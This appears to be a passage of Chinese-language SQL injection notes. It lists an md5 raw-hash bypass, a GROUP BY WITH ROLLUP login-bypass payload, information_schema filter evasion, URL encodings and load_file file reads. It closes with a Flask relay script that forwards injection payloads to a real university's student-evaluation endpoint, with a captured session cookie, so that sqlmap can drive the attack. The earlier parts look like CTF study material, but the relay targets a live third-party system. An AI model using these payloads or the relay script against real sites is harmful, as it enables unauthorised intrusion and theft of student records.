SELECT * FROM admin WHERE pass=’ ‘or ’ 6’
```

 ffifdyop、129581926211651571912466741651878684928 这两个字符串经过 md5(password, true)之后，首位是数字

## 7.with rollup

**group by（将结果集中的数据行根据选择列的值进行逻辑分组）**

不加 group by 的查询结果

```sql
sql语句：select password from user
```

查询结果：

| password |
| -------- |
| 1        |
| 1        |
| 2        |
| 3        |

加入 group by 的查询结果

```
sql语句：select password,count(*) from user group by password;
```

查询结果：

| password | count(*) |
| -------- | -------- |
| 1        | 2        |
| 2        | 1        |
| 3        | 1        |



**with rollup （group by 后可以跟 with rollup，表示在进行分组统计的基础上再次进行汇总统计）**

```
sql语句：select password,count(*) from user group by password with rollup;
```

| password | count(*) |
| -------- | -------- |
| 1        | 2        |
| 2        | 1        |
| 3        | 1        |
| NULL     | 4        |

对密码进行验证时可以使用这个，使得 NULL = NULL 即可

```
payload:username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&password=
```

## information_schema.tables、information_schema.columns 过滤

使用

```
information_schema.`tables`
```

## 9.常见url编码

```
+	%2B
@	%40
:	%3A
;	%3B
<	%3C
=	%3D
>	%3E
?	%3F
z	%7A
{	%7B
}	%7D
~	%7E
空格	%20
！	%21
"	%22
#	%23
$	%24
%	%25
&	%26
'	%27
(	%28
)	%29
0	%30
1	%31
```



# 8.直接读取文件

有的 sql 注入题目可以直接读取一些相关页面，可以读到 flag

使用 load_file 读一下

```
-1 union select load_file('var/www/html/index.php')
```

# 9.flask

```pyhton
from flask import Flask,request,jsonify
from bs4 import BeautifulSoup
import requests

def remote_login(payload):
    burp0_url = "https://pzxg.peizheng.edu.cn:443/sms3/class/evaluationNew/stuEvaApplicationStuAllAddList.jsp"
    burp0_cookies = {"JSESSIONID": "CD45B234B081F3FB7FB53558810111EE.sms49_01"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
                     "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                     "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded",
                     "Origin": "https://pzxg.peizheng.edu.cn",
                     "Referer": "https://pzxg.peizheng.edu.cn/sms3/class/evaluationNew/stuEvaApplicationStuAllAddList.jsp",
                     "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "iframe", "Sec-Fetch-Mode": "navigate",
                     "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=4", "Te": "trailers",
                     "Connection": "close"}
    burp0_data = {"action_name": "search", "session_token": "token_key_1729053975118",
                  "search_evaluationTemplateId": "19", "search_studentId": f"{payload}", "search_commonName": '',
                  "search_naturalClassId": '', "search_name": '', "evaluationItemId": '', "search_role": '',
                  "search_auditStatue": '', "_tableColumnId": "\xe5\xad\xa6\xe5\x8f\xb7",
                  "_tableColumnId": "\xe5\xa7\x93\xe5\x90\x8d", "_tableColumnId": "\xe7\x8f\xad\xe7\xba\xa7",
                  "_tableColumnId": "\xe6\xb5\x8b\xe8\xaf\x84\xe7\xb1\xbb\xe5\x9e\x8b",
                  "_tableColumnId": "\xe5\x90\x8d\xe7\xa7\xb0", "_tableColumnId": "\xe7\xba\xa7\xe5\x88\xab",
                  "_tableColumnId": "\xe5\x88\x86\xe6\x95\xb0", "_tableColumnId": "\xe9\x99\x84\xe4\xbb\xb6",
                  "_tableColumnId": "\xe5\xae\xa1\xe6\xa0\xb8\xe7\x8a\xb6\xe6\x80\x81",
                  "_tableColumnId": "\xe6\x93\x8d\xe4\xbd\x9c", "scroll.pageSize": "10", "scroll.pageIndex": "0",
                  "sort.sortColumn": "s.XH", "sort.ascending": "true", "example1_length": "10"}
    response=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

    return response.text

app = Flask(__name__)
@app.route('/')
def login():
    playload = request.args.get("id")
    print(playload)
    html_content = remote_login(playload)
    return html_content

if __name__=='__main__':
    app.run()
```

flask转发脚本，将测试可以注入的点用payload代替即可

然后配合sqlmap使用